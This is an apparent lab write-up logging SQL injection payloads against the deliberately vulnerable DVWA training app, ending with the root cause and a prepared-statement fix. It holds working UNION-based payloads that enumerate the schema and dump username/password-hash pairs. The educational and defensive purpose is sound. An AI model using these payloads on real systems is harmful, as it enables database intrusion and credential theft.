# SQL Injection — Payload Log & Analysis

**Target:** DVWA — SQL Injection module
**Security Level:** Low
**Injection Point:** `User ID` field (GET/POST parameter `id`)
**Backend query (Low security source):**
```php
$id = $_REQUEST['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

This file is a chronological log of every payload used during the exploitation, what it
does, what it returned, and why it works — intended as a reference for the README and
for interview prep.

---

## 1. Baseline Test

**Payload:**
```
1
```

**Purpose:** establish normal application behavior before injecting anything, so any
deviation afterward is clearly attributable to the injection rather than assumed.

**Result:** returned a single user's first name and surname.

**Analysis:** confirms the query executes as intended for well-formed numeric input —
nothing abnormal yet. This is the control against which every later payload is compared.

---

## 2. Injection Confirmation

**Payload:**
```
1' OR '1'='1
```

**Resulting query on the backend:**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

**Purpose:** test whether the input is treated as literal data (safe) or as executable
SQL syntax (vulnerable).

**Result:** returned all 5 users — admin, Gordon Brown, Hack Me, Pablo Picasso, Bob
Smith — instead of just user ID 1.

**Analysis:** `'1'='1'` is a tautology, always evaluating true. Because the input closed
the original string literal early (`'1'`) and appended new SQL logic (`OR '1'='1'`), the
`WHERE` clause was satisfied for every row in the table. This is the single clearest
signal that the application concatenates input directly into the query with no
sanitization or parameterization — the core root cause behind every subsequent step.

---

## 3. Column Count Discovery

**Payloads (run sequentially):**
```
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -
```

**Purpose:** `UNION SELECT` requires the injected query to return the exact same number
of columns as the original query. `ORDER BY <n>` sorts by column *position*; incrementing
`n` until an error appears reveals the column count without needing source-code access.

**Result:**
- `ORDER BY 1` → succeeded
- `ORDER BY 2` → succeeded
- `ORDER BY 3` → error: unknown column `3` in `'order clause'`

**Analysis:** confirms the query selects exactly **2 columns** (`first_name`,
`last_name`), matching the known source. Any UNION SELECT from this point forward must
supply exactly 2 columns or MySQL will reject it outright.

**Note on syntax — `-- -`:** DVWA's query template appends a trailing `'` after the
injected value (`WHERE user_id = '$id';`). The `--` opens a SQL comment; the following
space plus `-` gives the comment content so the parser doesn't choke on an empty
comment — this reliably swallows the trailing quote and prevents a syntax error
unrelated to the injection itself.

---

## 4. UNION-Based Recon

**Payload:**
```
1' UNION SELECT database(), version()-- -
```

**Purpose:** verify the UNION injection is structurally correct (right column count,
right syntax) using safe, non-sensitive built-in functions before querying real data.

**Result:** returned the active database name (`dvwa`) and the MariaDB version string in
place of a normal first/last name.

**Analysis:** `database()` and `version()` are built-in scalar functions available in
any MySQL/MariaDB context — they don't require table access, making them ideal for a
low-risk sanity check. Success here confirms every later, more targeted UNION query will
follow the same pattern.

---

## 5. Table Enumeration

**Payload:**
```
1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=database()-- -
```

**Purpose:** discover every table inside the current database without needing to guess
names.

**Result:** returned table names including `users` and `guestbook`.

**Analysis:** `information_schema` is a built-in, read-only metadata database present on
every MySQL/MariaDB server, listing every table, column, and schema on the instance. The
`WHERE table_schema=database()` filter narrows results to only the current app's
database, avoiding noise from unrelated system tables. This is the step that turns SQLi
from "return data I already know the shape of" into "map the entire database structure
from scratch."

---

## 6. Column Enumeration

**Payload:**
```
1' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'-- -
```

**Purpose:** identify the exact column names and types inside the `users` table before
attempting to extract data from it.

**Result:** returned columns including `user_id`, `first_name`, `last_name`, `user`,
`password`, `avatar`.

**Analysis:** confirms `user` and `password` are the columns holding login credentials —
the specific target for the final extraction step. Querying metadata before querying
data avoids blind guessing and mirrors how a real attacker (or a pentester writing a
reproducible report) would work methodically rather than randomly.

---

## 7. Credential Extraction

**Payload:**
```
1' UNION SELECT user, password FROM users-- -
```

**Purpose:** the actual data exfiltration step — pull every username and password hash
directly out of the authentication table.

**Result:** returned all 5 username / password-hash pairs from the `users` table.

**Analysis:** DVWA at Low security stores passwords as **unsalted MD5** hashes, meaning
each identical password produces an identical hash, and common ones are crackable
near-instantly against precomputed wordlists (e.g., `rockyou.txt`). This step
demonstrates the full real-world impact chain: an unsanitized input field → structural
query manipulation → schema enumeration → full credential table dump — achieved entirely
through a browser, with no additional tools required.

---

## Summary Table

| # | Payload | Technique | What It Revealed |
|---|---|---|---|
| 1 | `1` | Baseline | Normal single-row behavior |
| 2 | `1' OR '1'='1` | Boolean tautology | Confirmed injection; returned all rows |
| 3 | `1' ORDER BY 1/2/3-- -` | Column count discovery | Query selects 2 columns |
| 4 | `1' UNION SELECT database(), version()-- -` | UNION recon | DB name + server version |
| 5 | `1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=database()-- -` | Table enumeration | Table names (`users`, `guestbook`, ...) |
| 6 | `1' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'-- -` | Column enumeration | Column names (`user`, `password`, ...) |
| 7 | `1' UNION SELECT user, password FROM users-- -` | Data extraction | Full username/password-hash dump |

## Root Cause (One-Line Version)
User input was concatenated directly into a SQL query string instead of being passed as
a separate, typed parameter — the database could not distinguish injected SQL syntax
from legitimate data.

## Primary Fix
Parameterized queries / prepared statements (e.g., `mysqli::prepare()` with bound
parameters in PHP) — the query structure is sent to the database independently of the
data, so user input is never interpreted as SQL syntax, regardless of its content.
